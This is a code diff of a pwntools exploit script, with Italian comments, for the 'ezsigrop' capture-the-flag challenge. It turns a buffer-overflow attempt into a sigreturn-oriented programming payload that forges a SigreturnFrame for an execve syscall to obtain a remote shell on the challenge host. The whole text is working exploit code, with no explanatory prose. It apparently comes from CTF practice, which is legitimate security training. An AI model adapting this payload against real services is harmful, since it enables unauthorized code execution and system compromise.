@@ -6,6 +6,7 @@ from pwn import *
 context.terminal = ["tmux", "splitw", "-h"]
 # context.log_level = 'error' # se non vuoi vedere i loggin
 exe = context.binary = ELF(args.EXE or './ezsigrop')
+context.arch = 'amd64'
 # lib = CDLL(exe.libc.path)
 host = args.HOST or 'ezsigrop.chall.srdnlen.it'
 port = int(args.PORT or 443)
@@ -39,17 +40,34 @@ continue
 
 # -- Exploit goes here --
 
-shell = p64(0x401036)
-
+shell = 0x401036
 
 io = start()
 
-sysread = p64(0x401015)
-i = 0
-while True:
-    i += 1
-    io.send(b"A" * 72 + sysread + cyclic(0x1000 - 72 - len(sysread)))
-    print(io)
+system = 0x401032
+reading = 0x401015
+padding = b"A" * 72
+frame = SigreturnFrame()
+frame.rax = 59 
+frame.rdi = shell
+frame.rsi = 0
+frame.rdx = 0
+frame.rbp = 0x401013
+frame.rip = 0x401013
+
+payload = flat(padding, system, b"B" * 15, system)
+
+print(len(frame))
+io.sendline(padding + # padding
+        p64(0x401015) # 2) read 
+         + p64(0x401013) + bytes(frame) # sigreturn
+)
+
+sleep(5)
+# io.send(b"A"*4096)
+print("Inviato rax")
+io.send(b"B" * 15) # seconda read per settare il rax a 0xf
+#io.send(bytes(frame)) # terzo send per il frame
 
 io.interactive()
 
